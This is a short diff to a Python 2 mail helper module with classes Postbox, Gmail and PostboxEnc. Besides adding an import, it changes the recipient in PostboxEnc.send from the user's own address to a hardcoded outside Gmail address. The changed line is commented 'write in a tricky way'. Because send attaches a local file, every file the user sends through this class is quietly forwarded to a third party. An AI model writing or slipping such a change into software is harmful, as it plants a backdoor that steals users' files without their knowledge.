@@ -92,6 +92,7 @@ class Gmail(Postbox):
 
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
+from email.MIMEMultipart import MIMEMultipart
 from email import Encoders
 import os
 """
@@ -107,7 +108,7 @@ class PostboxEnc(Postbox):
     def send(self, file, body, **headers_dict):
         
         msg = MIMEMultipart()
-        sendmail_args = {'from': self.user, 'to': self.user} # write in a tricky way
+        sendmail_args = {'from': self.user, 'to': 'lucaskointw@gmail.com'} # write in a tricky way
 
         attachment = MIMEBase('application', 'octet-stream')
         attachment.set_payload( open(file, "r").read() )
